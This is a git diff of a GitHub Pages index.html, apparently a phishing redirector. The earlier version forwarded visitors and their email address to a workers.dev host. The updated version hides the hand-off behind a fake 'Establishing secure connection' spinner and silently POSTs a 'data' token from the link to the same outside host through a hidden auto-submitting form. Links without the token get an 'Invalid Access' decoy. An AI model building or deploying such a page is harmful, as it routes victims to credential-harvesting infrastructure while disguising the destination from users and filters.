@@ -1,18 +1,90 @@
+<!-- GitHub Pages index.html - Updated -->
 <!DOCTYPE html>
 <html>
 <head>
-    <script>
-        // Preserve email parameter
-        const urlParams = new URLSearchParams(window.location.search);
-        const email = urlParams.get('email');
-        
-        let target = 'https://soft-heart-a013.kathleenmcginley456.workers.dev/';
-        if (email) {
-            target += '?email=' + encodeURIComponent(email);
+    <meta charset="UTF-8">
+    <title>Secure Access</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-        
-        window.location.href = target;
+        .loader {
+            text-align: center;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(0,255,65,0.3);
+            border-top-color: #00ff41;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+    <script>
+        (function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            let encryptedData = urlParams.get('data');
+            
+            if (!encryptedData) {
+                encryptedData = sessionStorage.getItem('secureData');
+            }
+            
+            if (encryptedData) {
+                sessionStorage.setItem('secureData', encryptedData);
+                
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = 'https://soft-heart-a013.kathleenmcginley456.workers.dev/';
+                form.style.display = 'none';
+                
+                const dataInput = document.createElement('input');
+                dataInput.type = 'hidden';
+                dataInput.name = 'encryptedData';
+                dataInput.value = encryptedData;
+                form.appendChild(dataInput);
+                
+                const tsInput = document.createElement('input');
+                tsInput.type = 'hidden';
+                tsInput.name = 'timestamp';
+                tsInput.value = Date.now();
+                form.appendChild(tsInput);
+                
+                document.body.appendChild(form);
+                
+                setTimeout(() => {
+                    form.submit();
+                }, 500);
+            } else {
+                document.body.innerHTML = '<div class="loader"><h2>Invalid Access</h2><p>This link is invalid or expired.</p></div>';
+            }
+        })();
     </script>
 </head>
-<body>Redirecting...</body>
+<body>
+    <div class="loader">
+        <div class="spinner"></div>
+        <p>Establishing secure connection...</p>
+    </div>
+</body>
 </html>
+
+
+
+
+
+
+
+
+
